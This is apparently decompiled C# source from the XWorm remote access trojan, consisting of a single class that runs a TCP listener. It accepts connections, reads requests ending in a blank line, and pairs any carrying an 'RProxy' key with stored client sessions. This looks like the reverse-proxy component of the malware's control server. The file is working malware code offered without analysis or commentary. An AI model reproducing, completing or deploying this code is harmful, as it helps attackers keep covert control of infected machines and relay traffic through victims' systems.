using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm;

public class GClass7
{
	private static Thread thread_0;

	private static TcpListener tcpListener_0;

	public int int_0;

	public int int_1;

	private string string_0;

	public GClass7()
	{
		string_0 = "|";
	}

	public void method_0(int int_0, int int_1, int Port)
	{
		this.int_0 = int_0;
		this.int_1 = int_1;
		tcpListener_0 = new TcpListener(IPAddress.Any, Port);
		tcpListener_0.Start();
		thread_0 = new Thread(method_1);
		thread_0.Start();
	}

	public static void smethod_0()
	{
		try
		{
			tcpListener_0.Stop();
			thread_0?.Abort();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_1()
	{
		while (true)
		{
			try
			{
				TcpClient parameter = tcpListener_0.AcceptTcpClient();
				new Thread(method_3).Start(parameter);
				Thread.Sleep(50);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_2(TcpClient tcpClient_0)
	{
		try
		{
			NetworkStream stream = tcpClient_0.GetStream();
			byte[] array = new byte[1];
			StringBuilder stringBuilder = new StringBuilder();
			do
			{
				int num = stream.Read(array, 0, array.Length);
				if (num != 0)
				{
					stringBuilder.Append(Encoding.ASCII.GetString(array, 0, num));
					continue;
				}
				tcpClient_0.Close();
				stream.Close();
				return;
			}
			while (!stringBuilder.ToString().EndsWith("\r\n\r\n"));
			stringBuilder = new StringBuilder(Uri.UnescapeDataString(stringBuilder.ToString()));
			if (stringBuilder.ToString().Contains("RProxy"))
			{
				string text = stringBuilder.ToString().Substring(checked(stringBuilder.ToString().IndexOf(":") + 1));
				text = text.Substring(0, text.IndexOf("\r\n"));
				bool flag = false;
				try
				{
					foreach (GClass6 item in Main.gclass6s_0)
					{
						if (Operators.CompareString(item.key, text, TextCompare: false) == 0)
						{
							item.tcpClient_0 = tcpClient_0;
							flag = true;
							break;
						}
					}
				}
				finally
				{
					List<GClass6>.Enumerator enumerator2 = default(List<GClass6>.Enumerator);
					((IDisposable)enumerator2).Dispose();
				}
				if (!flag)
				{
					tcpClient_0.Close();
					stream.Close();
				}
			}
			else
			{
				tcpClient_0.Close();
				stream.Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			tcpClient_0.Close();
			ProjectData.ClearProjectError();
		}
	}

	private void method_3(object object_0)
	{
		method_2((TcpClient)object_0);
	}
}

